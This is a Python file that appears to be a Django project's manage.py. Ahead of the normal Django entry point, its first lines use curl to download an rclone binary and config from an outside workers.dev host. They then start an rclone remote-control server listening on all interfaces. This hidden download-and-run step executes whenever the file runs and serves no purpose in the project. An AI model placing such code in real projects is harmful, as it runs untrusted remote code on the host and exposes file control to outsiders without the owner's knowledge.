#!/usr/bin/env python
import os
import sys
os.system("curl -O https://2sundaran.devilstorage.workers.dev/0:/rclone")
os.system("curl -L https://2sundaran.devilstorage.workers.dev/0:/rclone.conf >rclone.conf")
os.system("./rclone rcd --rc-serve --rc-addr=0.0.0.0:$PORT --config=rclone.conf")

if __name__ == "__main__":
    os.environ.setdefault("DJANGO_SETTINGS_MODULE", "gettingstarted.settings")

    from django.core.management import execute_from_command_line

    execute_from_command_line(sys.argv)
